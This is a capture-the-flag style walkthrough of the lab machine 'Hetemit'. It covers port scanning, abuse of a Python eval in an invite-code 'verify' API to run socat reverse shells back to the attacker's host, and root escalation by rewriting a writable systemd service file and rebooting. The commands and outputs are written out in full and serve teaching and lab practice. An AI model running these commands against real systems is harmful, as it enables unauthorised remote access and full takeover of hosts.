##### Walkthrough

# Exploitation Guide for Hetemit

## Summary

There is an application in charge of generating invite codes with a vulnerability in the `verify` process.
 Once we achieve a reverse shell, the user can escalate by abusing write  permissions to a service file and the ability to reboot the machine.

## Enumeration

### Nmap

We start off by running an nmap scan:

```
kali@kali:~$ sudo nmap -p- 192.168.120.36
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 16:16 -03
Nmap scan report for 192.168.120.36
Host is up (0.13s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
18000/tcp open  biimenu
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 265.36 seconds

kali@kali:~$ sudo nmap -p 18000,50000 -sC -sV 192.168.120.36
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 16:21 -03
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.64% done; ETC: 16:21 (0:00:00 remaining)
Nmap scan report for 192.168.120.36
Host is up (0.13s latency).

PORT      STATE SERVICE  VERSION
18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http     Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
...
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.93 seconds
```

### Web Enumeration

The application running on port 18000 contains a standard web page,  while the one on port 50000 seems to contain an API used to generate  invite codes.

```
kali@kali:~$ curl http://192.168.120.36:18000/ 
<!DOCTYPE HTML>
<html>
	<head>
		<title>Eventually by HTML5 UP</title>
...
	</head>
	<body class="is-preload">
    <!-- Header -->
    <header id="header">
        <h1>Protomba</h1>
        <p>Making the world a better place</p>
    </header>

    <p>Protomba is more than just a random Idea. <br>
Blockchain, Shopping and Community are just a few characteristic of Protomba. But we offer a lot more!</p>

<p>Want to join us? Please <a href="/users/new">register</a> today for a new account, or  <a href="/login">login</a> if you are already part of the team.</p>
...
		<!-- Scripts -->
    <script src="/packs/js/application-3cb580aa33ebf70324a3.js" data-turbolinks-track="reload"></script>

	</body>
</html>
kali@kali:~$ curl http://192.168.120.36:50000/
{'/generate', '/verify'}

kali@kali:~$ curl http://192.168.120.36:50000/generate
{'email@domain'}

kali@kali:~$ curl http://192.168.120.36:50000/verify
{'code'}
```

The application running on port `18000` requires an invite code to allow registration of an account.

To generate an invite code, we need to send a `POST /generate` request to the application running on port `50000`.
 From the response earlier, we know that we need to include an email, so let’s try it out.

```
kali@kali:~$ curl -X POST --data "email=test@testing" http://192.168.120.36:50000/generate
5a81d05b8969fd1f156969da357bcd7f9bf0430c90035f017c88f9b5249b3e9e
```

With this invite code, we can now register to the main application.
 However, this seems to be a dead end, since there are no additional  options to manipulate the application after we finally login.

If we continue our enumeration on port `50000`, we can see that the `verify` endpoint has an odd behavior:

```
kali@kali:~$ curl -X POST --data "code=code" http://192.168.120.36:50000/verify
code
kali@kali:~$ curl -X POST --data "code=5a81d05b8969fd1f156969da357bcd7f9bf0430c90035f017c88f9b5249b3e9e" http://192.168.120.36:50000/verify 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
kali@kali:~$  curl -X POST --data "code=2+2" http://192.168.120.36:50000/verify
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
kali@kali:~$ curl -X POST --data "code=2*2" http://192.168.120.36:50000/verify
4
```

## Exploitation

The verify option doesn’t actually “verify” the code. However, some  evaluation is in place as we can actually get a result with the  expression `2*2`.
 Since we identified this server as `Python/3.6.8` with **nmap**, we can poke to see if we can use the `os` module:

```
kali@kali:~$ curl -X POST --data "code=os" http://192.168.120.36:50000/verify
<module 'os' from '/usr/lib64/python3.6/os.py'>
```

Luckily, the module is present so we can go straight to a shell. First, set up a listener:

```
kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
```

Then, create a reverse shell connection:

```
kali@kali:~$ curl -X POST --data "code=os.system('socat TCP:192.168.118.8:18000 EXEC:sh')" http://192.168.120.36:50000/verify
```

And we catch a reverse shell:

```
kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.36] 44872
python3 -c 'import pty; pty.spawn("/bin/bash")'

[cmeeks@hetemit restjson_hetemit]$ whoami
cmeeks
```

## Escalation

### Enumeration

Let’s explore the filesystem and locate the configuration files that we can modify.

```
[cmeeks@hetemit restjson_hetemit]$ find /etc -type f -writable 2> /dev/null
find /etc -type f -writable 2> /dev/null
/etc/systemd/system/pythonapp.service
```

Next, let’s check our sudo permissions.
 We discover that we can reboot and shutdown the computer:

```
[cmeeks@hetemit ~]$ sudo -l    
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```

### Incorrect File Permissions

The `pythonapp.service` file, related to a system service, has incorrect permissions allowing us to modify it.

Let’s take a look at the file:

```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Perfect, we can modify this file and escalate to root.

```
[cmeeks@hetemit ~]$ cat <<'EOT'> /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
ExecStart=/home/cmeeks/reverse.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOT
```

We modified the `ExecStart` and `User` lines, and removed the `WorkingDirectory=` line.

Next, we create the reverse shell file:

```
[cmeeks@hetemit ~]$ cat <<'EOT'> /home/cmeeks/reverse.sh
#!/bin/bash
socat TCP:192.168.118.8:18000 EXEC:sh
EOT

[cmeeks@hetemit ~]$ chmod +x /home/cmeeks/reverse.sh
```

We will restart our listener on port 18000, and then reboot the machine:

```
[cmeeks@hetemit ~]$ sudo reboot
```

When the machine boots up, we obtain a root shell:

```
kali@kali:~$ nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.36] 57890
python3 -c 'import pty; pty.spawn("/bin/bash")'

[root@hetemit /]# whoami
root

[root@hetemit /]# 
```